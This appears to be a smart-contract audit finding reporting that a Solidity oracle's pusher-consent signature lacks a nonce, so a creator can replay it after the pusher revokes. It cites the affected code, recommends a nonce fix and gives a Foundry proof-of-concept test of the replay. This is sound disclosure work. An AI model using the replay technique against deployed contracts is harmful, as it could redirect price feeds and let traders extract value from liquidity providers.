### Title
`allowPushers` delegation signature has no nonce, allowing a creator to replay a pusher's consent after the pusher self-revokes — (`File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`CompressedOracleV1::allowPushers` verifies a pusher's EIP-191 consent signature and writes `namespaceRemapping[pusher] = creator`. The signed hash commits to `(chainid, address(this), deadline, pusher, creator)` but contains **no nonce or revocation counter**. After a pusher calls `revokePusher()` to clear their delegation, the creator can immediately replay the identical signature (same deadline, same pusher, same creator) to re-establish the mapping. The pusher's self-revocation is silently nullified for the entire remaining lifetime of the deadline window.

### Finding Description

`allowPushers` constructs the consent hash as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

The only time-bounding element is `deadline`. There is no nonce, no per-pusher revocation counter, and no "signature already consumed" bitmap. The function unconditionally overwrites `namespaceRemapping[pusher]` on every successful call:

```solidity
namespaceRemapping[pusher] = msg.sender;
``` [2](#0-1) 

`revokePusher` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

But because `allowPushers` performs no idempotency or revocation check, the creator can call it again in the same transaction (or the next block) with the original signature to restore `namespaceRemapping[pusher] = creator`. The code comment explicitly acknowledges the problem but incorrectly claims the deadline solves it:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [4](#0-3) 

The deadline limits the *window* of replay but does not prevent re-establishment within that window. The invariant "a pusher who calls `revokePusher` immediately stops writing into the creator's namespace" is broken.

### Impact Explanation

The `fallback` push path resolves the effective namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

While the delegation is active, every fallback push from the pusher lands in the **creator's** namespace, not the pusher's own. If the pusher is also a feed creator whose feeds are consumed by a `PriceProvider` / pool, those feeds receive no updates (all writes are redirected to the creator's namespace), causing the pool to read a stale price. A stale price reaching a live swap is a bad-price execution impact: the pool's bid/ask is anchored to an outdated mid, allowing a trader to extract value at the expense of LPs.

### Likelihood Explanation

The trigger requires only that:
1. A pusher signed a consent with a future deadline (normal operational flow).
2. The pusher calls `revokePusher()` before the deadline expires.
3. The creator replays the same signature bytes in a new `allowPushers` call.

Step 3 is a single public transaction with no privileged access. The creator already holds the signature (they used it in step 1). The replay succeeds unconditionally as long as `block.timestamp <= deadline`. Likelihood is medium — it requires a motivated creator, but the mechanism is trivially executable.

### Recommendation

Include a per-pusher revocation counter (nonce) in the signed hash and increment it on every successful `revokePusher` / `removePushers` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender,
        pusherNonce[pusher]   // <-- add nonce
    ))
);

// In revokePusher / removePushers, after clearing the mapping:
pusherNonce[pusher]++;
```

This ensures that any signature issued before a revocation is cryptographically invalidated the moment `revokePusher` or `removePushers` executes.

### Proof of Concept

```solidity
// forge test --match-test testRevokeNullifiedBySignatureReplay -vvv
function testRevokeNullifiedBySignatureReplay() public {
    uint256 deadline = block.timestamp + 1 days;

    // 1. Pusher signs consent for creator
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator, "delegation active");

    // 3. Pusher self-revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

    // 4. Creator replays the SAME signature — no new consent from pusher
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);

    // 5. Delegation is re-established without pusher's knowledge
    assertEq(oracle.namespaceRemapping(pusher), creator,
        "FAIL: revocation nullified by signature replay");

    // 6. Pusher's next fallback push lands in creator's namespace, not their own
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(900_000, 5, 0);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);

    // Pusher's own feed is empty — their data was hijacked into creator's namespace
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0,
        "pusher's own feed is stale");
    assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0,
        "creator's namespace received pusher's data");
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-207)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L209-210)
```text
            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L241-242)
```text
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
